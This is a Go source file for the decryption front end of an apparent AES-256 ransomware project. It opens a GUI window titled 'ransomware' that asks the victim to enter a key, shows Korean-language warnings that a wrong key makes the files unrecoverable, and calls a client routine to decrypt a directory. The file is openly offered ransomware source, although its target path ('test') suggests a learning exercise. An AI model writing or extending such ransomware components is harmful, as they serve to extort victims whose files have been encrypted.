package main

import (
	"errors"
	"fmt"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/widget"
	"rswAES256/client"
	"rswAES256/config"
)

// 1. if you want to run this gui(fyne) in windows OS. you have to compile C language compiler.
// 2. you can run this gui(fyne) in Mac OS and linux.
// 3. if you want to run gui display in windows without C compiler. think about Gio Ui is Cross-Platform GUI for Go

func main() {
	a := app.New()
	w := a.NewWindow("ransomware")

	// 일반 텍스트 창
	hello := widget.NewLabel("Put key for decryption your files")

	// 입력창
	input := widget.NewEntry()
	input.SetPlaceHolder("here for key")

	// 윈도우 창에 보여줄 것을 정의
	w.SetContent(container.NewVBox(
		hello,
		input,

		// 버튼이 눌렸을때 동작해야 할 것들
		widget.NewButton("Submit", func() {
			// 입력값 가져오기
			key := input.Text

			// 입력값이 비어있는지 확인
			if key == "" {
				// 비어있다면 경고 메시지 표시
				dialog.ShowError(errors.New("키를 입력해주세요"), w)
				return
			}

			// 재확인 정보 메시지 생성.
			confirm := dialog.NewConfirm("확인", "검증되지 않은 키를 입력 시 파일을 되돌릴 수 없습니다. 정말 진행하시겠습니까?", func(ok bool) {
				//사용자가 '예'를 선택한 경우
				if ok {

					// 설정파일 설정.
					c := config.NewConfig("./../cmd/config.toml")
					fmt.Println(c)

					// 입력한 키를 client에 넣어줌.
					newClient := client.NewClient(c)
					newClient.Key = key

					//복호화 진행
					if err := newClient.AESDecryptDirectory("./../cmd/test"); err != nil {
						dialog.ShowError(err, w)
					}
					// 입력창 비우기
					input.SetText("")
				}
			}, w)
			confirm.Show() //confirm 보여주기
		}),
	))

	// main 윈도우 창 보여주기
	w.ShowAndRun()
}
